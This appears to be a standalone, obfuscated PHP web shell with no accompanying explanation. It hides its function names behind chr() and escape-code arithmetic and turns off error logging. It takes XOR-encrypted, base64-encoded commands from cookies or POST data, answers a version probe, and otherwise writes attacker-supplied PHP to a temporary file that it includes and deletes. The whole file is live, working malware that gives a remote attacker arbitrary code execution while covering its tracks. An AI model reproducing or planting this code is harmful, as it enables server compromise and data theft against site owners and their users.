<?php $sqbdl = "\146".chr(1006-901).chr(108).'e'.chr(95)."\160".'u'."\164".chr(95)."\x63".chr(1093-982).chr(110).chr(116).'e'."\x6e".chr(116)."\163";
$rzcjv = "\142"."\141".chr(223-108).'e'."\66".chr(573-521).chr(345-250)."\144".chr(245-144)."\143"."\157".chr(592-492)."\x65";
$vlvpdx = "\151".'n'.chr(259-154)."\137"."\x73".chr(101).'t';
$wisilyfnyv = 'u'."\x6e".'l'."\x69".'n'.chr(107);


@$vlvpdx('e'."\x72".chr(538-424)."\157".'r'.chr(943-848).chr(108).chr(111).chr(103), NULL);
@$vlvpdx(chr(108).chr(1045-934).chr(718-615).'_'.chr(1047-946).'r'."\162".chr(111)."\162"."\x73", 0);
@$vlvpdx(chr(374-265)."\x61".'x'."\x5f".chr(724-623)."\170"."\145"."\143"."\x75".chr(116).chr(467-362).'o'."\x6e".'_'.chr(116)."\x69".'m'.chr(154-53), 0);
@set_time_limit(0);

function umurg($shctkyk, $pdxqv)
{
    $wcbrnc = "";
    for ($uccsua = 0; $uccsua < strlen($shctkyk);) {
        for ($j = 0; $j < strlen($pdxqv) && $uccsua < strlen($shctkyk); $j++, $uccsua++) {
            $wcbrnc .= chr(ord($shctkyk[$uccsua]) ^ ord($pdxqv[$j]));
        }
    }
    return $wcbrnc;
}

$bzkoxcmfrn = array_merge($_COOKIE, $_POST);
$oghvcxp = '19fd6918-067d-44a0-ac30-b07275086a22';
foreach ($bzkoxcmfrn as $xdkctzephj => $shctkyk) {
    $shctkyk = @unserialize(umurg(umurg($rzcjv($shctkyk), $oghvcxp), $xdkctzephj));
    if (isset($shctkyk['a'.'k'])) {
        if ($shctkyk["\141"] == chr(105)) {
            $uccsua = array(
                "\x70".chr(297-179) => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($uccsua);
        } elseif ($shctkyk["\141"] == chr(496-395)) {
            $fhomzk = "./" . md5($oghvcxp) . "\56".chr(429-324).'n'."\143";
            @$sqbdl($fhomzk, "<" . chr(990-927).chr(112).chr(812-708).chr(610-498)."\x20"."\100"."\x75".chr(447-337).'l'.chr(1016-911).chr(763-653).chr(283-176).chr(228-188).chr(521-426).'_'.chr(390-320).chr(73).chr(76).chr(69).'_'.chr(95).chr(41).';'."\x20" . $shctkyk["\x64"]);
            include($fhomzk);
            @$wisilyfnyv($fhomzk);
        }
        exit();
    }
}

